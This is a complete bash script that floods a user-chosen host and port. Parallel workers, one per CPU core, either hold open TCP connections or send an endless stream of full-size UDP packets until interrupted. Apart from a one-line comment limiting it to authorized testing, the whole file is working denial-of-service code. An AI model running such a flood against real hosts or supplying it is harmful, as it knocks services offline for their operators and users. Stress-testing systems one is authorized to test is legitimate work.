#!/usr/bin/env bash
# Floods a target host with held-open TCP connections or UDP packets from parallel workers
# Only for use against systems you are authorized to test

udp_packet_size_bytes=1472
udp_report_interval=50000
tcp_report_interval=25

while :; do
    read -rp "Protocol - (T)CP or (U)DP? " answer
    case "${answer^^}" in
        T|TCP) protocol="TCP"; break ;;
        U|UDP) protocol="UDP"; break ;;
    esac
done

read -rp "Target host: " host_address

while :; do
    read -rp "Target port (1-65535): " answer
    if [[ "$answer" =~ ^[0-9]+$ ]] && [ "$answer" -ge 1 ] && [ "$answer" -le 65535 ]; then
        port_number="$answer"
        break
    fi
done

worker_count=$(nproc 2>/dev/null || echo 4)
worker_pids=()

stop_workers() {
    for worker_pid in "${worker_pids[@]}"; do
        kill "$worker_pid" 2>/dev/null
    done
    wait 2>/dev/null
}
trap stop_workers EXIT INT TERM

if [ "$protocol" = "TCP" ]; then
    echo "Flooding ${host_address}:${port_number} with TCP connections from ${worker_count} parallel workers (Ctrl+C to stop and release)..."
    tcp_worker() {
        connection_count=0
        while :; do
            if exec {descriptor}<>/dev/tcp/"${host_address}"/"${port_number}" 2>/dev/null; then
                connection_count=$((connection_count + 1))
                if [ $((connection_count % tcp_report_interval)) -eq 0 ]; then
                    echo "Worker: ${connection_count} connections held"
                fi
            else
                sleep 0.02
            fi
        done
    }
    for worker_number in $(seq "$worker_count"); do
        tcp_worker &
        worker_pids+=("$!")
    done
else
    echo "Flooding ${host_address}:${port_number} with UDP packets from ${worker_count} parallel workers (Ctrl+C to stop)..."
    udp_worker() {
        exec {descriptor}>/dev/udp/"${host_address}"/"${port_number}"
        packet=$(printf "%${udp_packet_size_bytes}s" x)
        sent_count=0
        while :; do
            printf '%s' "$packet" >&"$descriptor"
            sent_count=$((sent_count + 1))
            if [ $((sent_count % udp_report_interval)) -eq 0 ]; then
                echo "Worker: ${sent_count} packets sent"
            fi
        done
    }
    for worker_number in $(seq "$worker_count"); do
        udp_worker &
        worker_pids+=("$!")
    done
fi

wait
